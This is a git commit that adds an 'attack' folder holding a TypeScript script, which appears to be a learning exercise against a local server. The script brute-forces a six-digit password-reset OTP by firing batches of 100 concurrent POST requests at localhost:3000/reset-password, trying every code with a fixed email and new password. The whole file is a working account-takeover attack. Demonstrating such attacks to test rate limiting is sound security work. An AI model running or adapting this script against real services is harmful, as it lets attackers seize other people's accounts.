7b072ac064842bea92e1c7af9d74cbf46418f6d8
Anubhav Singh <anubhavsinghbkj@gmail.com>
2025-04-26 14:05:06 +0530

    adding a attack folder

---
+++ attack/src/index.ts
@@ -0,0 +1,41 @@
+import axios from "axios";
+
+async function sendRequest(otp: string) {
+  let data = JSON.stringify({
+    email: "anubhav@gmail.com",
+    otp: otp,
+    newPassword: "11223344",
+  });
+
+  let config = {
+    method: "post",
+    maxBodyLength: Infinity,
+    url: "http://localhost:3000/reset-password",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    data: data,
+  };
+
+  axios
+    .request(config)
+    .then((response) => {
+      console.log(JSON.stringify(response.data));
+    })
+    .catch((error) => {
+      console.log(error);
+    });
+}
+
+async function main() {
+  for (let i = 0; i < 1000000; i += 100) {
+    const promises = [];
+    console.log("here for " + i);
+    for (let j = 0; j < 100; j++) {
+      promises.push(sendRequest(i + j));
+    }
+    await Promise.all(promises);
+  }
+}
+
+main();
